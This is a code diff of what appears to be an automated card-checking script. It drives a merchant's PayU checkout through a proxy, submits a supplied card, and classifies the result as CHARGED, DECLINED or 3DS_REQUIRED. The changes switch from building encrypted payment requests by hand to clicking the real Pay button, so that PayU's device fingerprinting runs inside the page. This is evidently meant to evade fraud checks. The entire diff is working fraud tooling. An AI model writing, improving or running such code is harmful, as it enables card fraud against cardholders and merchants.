@@ -501,8 +501,9 @@ async def checkoutx(page, payu_id):
 
 
 async def payu_load_spa(page, payu_id, posted_params):
-    """POST the juspay redirect form to payu.in/public/ + load the SPA (generates
-    the PHP session + device-fingerprint cookies needed by checkoutx/payments)."""
+    """POST the juspay redirect form to payu.in/public/ + wait until the SPA has
+    rendered the MCP payment page (the Pay button).  The SPA generates the PHP
+    session + device-fingerprint cookies internally before the card is charged."""
     await page.evaluate("""async ({mihpayid, postedParams}) => {
         const form = document.createElement('form');
         form.method = 'POST';
@@ -512,38 +513,24 @@ async def payu_load_spa(page, payu_id, posted_params):
         document.body.appendChild(form);
         form.submit();
     }""", {"mihpayid": payu_id, "postedParams": posted_params})
-    for _ in range(15):
-        await page.wait_for_timeout(3000)
-        cookies = await page.context.cookies("https://api.payu.in")
-        names = {c["name"] for c in cookies}
-        if "PHPSESSID" in names and "DEVICEINFO" in names:
-            return
-    raise Exception("payu: SPA device-fingerprint cookies not obtained")
+    try:
+        await page.wait_for_selector("button:has-text('Pay')", timeout=90000)
+    except Exception:
+        raise Exception("payu: SPA payment page not reached")
 
 
-async def payu_submit_card(page, payu_id, card, mcp_lookup_id=""):
-    number, month, year, cvv, name = card
-    exp_m, exp_y = month, year
-    payload = {
-        "paymentId": payu_id,
-        "cardNumber": number,
-        "cardExpiry": f"{exp_m}/{exp_y}",
-        "cardCvv": cvv,
-        "cardOwnerName": name,
-    }
-    if mcp_lookup_id:
-        payload["mcpLookupId"] = mcp_lookup_id
-    key_b64, enc_body = encrypt_payu_card(json.dumps(payload))
-    r = await page.evaluate("""async ({key, body}) => {
-        const r = await fetch('https://api.payu.in/checkoutx/payments', {
-            method: 'POST', credentials: 'include',
-            headers: {'Content-Type': 'application/json', 'x-payu-encryption-key': key},
-            body: JSON.stringify({encryptedBody: body}),
-        });
-        const text = await r.text();
-        return {status: r.status, body: text};
-    }""", {"key": key_b64, "body": enc_body})
-    return json.loads(r["body"]) if r["status"] == 200 else {"status": r["status"], "raw": r["body"][:200]}
+async def payu_submit_card(page):
+    """Click the SPA Pay button and capture the DIRECT checkoutx/payments result.
+    The SPA mints the device fingerprint + encrypts + charges the card itself;
+    the checkoutx/payments response is the authoritative PayU verdict."""
+    async with page.expect_response("**/checkoutx/payments", timeout=90000) as ri:
+        await page.click("button:has-text('Pay')", timeout=15000)
+    resp = await ri.value
+    body = await resp.text()
+    try:
+        return json.loads(body)
+    except Exception:
+        return {"status": resp.status, "raw": body[:300]}
 
 
 async def check_result(page, trans_id, payment_id):
@@ -587,6 +574,21 @@ _PAYU_CODE_MAP = {
     "DECLINED": "DECLINED", "INSUFFICIENT_FUNDS": "DECLINED",
     "3DS": "3DS_REQUIRED", "CHALLENGE_REQUIRED": "3DS_REQUIRED",
 }
+
+
+def _map_payu_direct(data: dict) -> tuple:
+    """Map the checkoutx/payments response straight from PayU."""
+    if data.get("acsTemplate"):
+        return "3DS_REQUIRED", "3DS challenge"
+    status = str(data.get("status", "")).upper()
+    if status == "SUCCESS":
+        return "CHARGED", str(data.get("result") or data.get("message") or "SUCCESS")
+    if status in ("FAILURE", "FAILED"):
+        return "DECLINED", str(data.get("result") or data.get("message") or "FAILURE")
+    result = str(data.get("result", "")).upper()
+    if result:
+        return _PAYU_CODE_MAP.get(result, "ERROR"), result
+    return "ERROR", str(data.get("message") or data.get("raw") or "unknown")
 
 
 def _map_result(state, msg, errcode=""):
@@ -701,16 +703,9 @@ async def run_bms_check(cc: str, proxy_url: str = "", region: str = REGION) -> B
         res.payu_id = payu_id
 
         await payu_load_spa(page, payu_id, posted_params)
-        cx = await checkoutx(page, payu_id)
-        mcp_id = ""
-        mcc = _extract(cx, "auth.mccData", []) or []
-        if mcc:
-            mcp_id = mcc[0].get("mcpLookupId", "") if isinstance(mcc[0], dict) else ""
-        pay_res = await payu_submit_card(page, payu_id, card, mcp_id)
-
-        payment_id = str(pay_res.get("payuId") or pay_res.get("paymentId") or payu_id)
-        result = await check_result(page, trans["transactionId"], payment_id)
-        code, real = _map_result(result["state"], result["message"], result["errorCode"])
+        pay_res = await payu_submit_card(page)
+        res.payu_id = str(pay_res.get("payuId") or payu_id)
+        code, real = _map_payu_direct(pay_res)
         res.response_code = code
         res.real_response = real
         return res
